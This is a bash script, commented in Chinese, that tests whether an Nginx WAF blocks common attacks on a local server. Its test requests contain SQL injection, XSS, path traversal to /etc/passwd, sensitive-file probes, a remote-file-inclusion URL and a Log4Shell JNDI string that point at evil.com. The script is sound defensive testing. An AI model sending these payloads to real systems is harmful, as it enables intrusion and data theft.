#!/bin/bash

# 配置目标 URL
TARGET_URL="http://localhost:8080"
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo "🚀 开始测试 Nginx WAF 规则..."
echo "目标服务器: $TARGET_URL"
echo "---------------------------------------------------"

check_status() {
	local url="$1"
	local expected_code="$2"
	local description="$3"
	local user_agent="${4:-curl/7.68.0}" # 默认 User-Agent

	response_code=$(curl -s -o /dev/null --path-as-is -w "%{http_code}" -A "$user_agent" "$url")

	if [ "$response_code" == "$expected_code" ]; then
		echo -e "${GREEN}[PASS]${NC} $description (Expected: $expected_code, Got: $response_code)"
	else
		echo -e "${RED}[FAIL]${NC} $description (Expected: $expected_code, Got: $response_code)"
	fi
}

# 0. 正常访问测试
check_status "$TARGET_URL/api/test" "200" "正常 API 访问"

# 1. 恶意扫描工具检测
check_status "$TARGET_URL/" "403" "恶意 User-Agent (sqlmap)" "sqlmap/1.0"
check_status "$TARGET_URL/" "403" "恶意 User-Agent (nmap)" "nmap/7.80"

# 2. 敏感文件访问防护
check_status "$TARGET_URL/.env" "403" "访问 .env 文件"
check_status "$TARGET_URL/.git/config" "403" "访问 .git 目录"
check_status "$TARGET_URL/config.php" "404" "访问普通文件 (不存在)" # 修正预期为 404，因为文件确实不存在，且不应被 WAF 拦截
# 注意：config.php 不在拦截列表中，但 .config 在拦截列表中。这里测试一个不在列表中的 php 文件，如果文件不存在通常是 404，如果 WAF 拦截是 403。
# 由于我们没有 config.php，预期应该是 404，除非被其他规则拦截。
# 修正测试逻辑：测试明确在列表中的文件
check_status "$TARGET_URL/wp-config.php" "403" "访问 wp-config.php"

# 3. 路径遍历攻击防护
# 注意：Nginx 可能会对 ../../ 开头的请求直接返回 400 Bad Request，这也是一种防护
check_status "$TARGET_URL/../../etc/passwd" "400" "路径遍历 (../../etc/passwd) - Nginx Core Block"
check_status "$TARGET_URL/etc/passwd" "403" "路径遍历 (/etc/passwd) - WAF Block"
check_status "$TARGET_URL/?file=../../etc/passwd" "403" "参数路径遍历"

# 4. 管理后台路径防护 (返回 404)
check_status "$TARGET_URL/phpmyadmin/" "404" "访问 phpmyadmin (应返回 404)"
check_status "$TARGET_URL/wp-admin/" "404" "访问 wp-admin (应返回 404)"

# 5. 恶意请求方法防护
# curl -X TRACE ...
response_code=$(curl -s -o /dev/null -w "%{http_code}" -X TRACE "$TARGET_URL/")
if [ "$response_code" == "405" ]; then
	echo -e "${GREEN}[PASS]${NC} TRACE 方法请求 (Expected: 405, Got: $response_code)"
else
	echo -e "${RED}[FAIL]${NC} TRACE 方法请求 (Expected: 405, Got: $response_code)"
fi

# 6. SQL 注入攻击防护
check_status "$TARGET_URL/?id=1+union+select+1,2,3" "403" "SQL 注入 (union select)"
check_status "$TARGET_URL/?query=drop+table+users" "403" "SQL 注入 (drop table)"

# 7. XSS 跨站脚本攻击防护
check_status "$TARGET_URL/?q=<script>alert(1)</script>" "403" "XSS 攻击 (<script>)"
check_status "$TARGET_URL/?url=javascript:alert(1)" "403" "XSS 攻击 (javascript:)"

# 8. 文件包含攻击防护 (LFI/RFI)
check_status "$TARGET_URL/?file=http://evil.com/shell.php" "403" "远程文件包含 (http://)"
check_status "$TARGET_URL/?wrapper=php://input" "403" "PHP 伪协议包含"

# 9. Log4Shell / JNDI 注入防护
check_status "$TARGET_URL/?x=\${jndi:ldap://evil.com/a}" "403" "Log4Shell jndi:ldap"

echo "---------------------------------------------------"
echo "测试完成。"
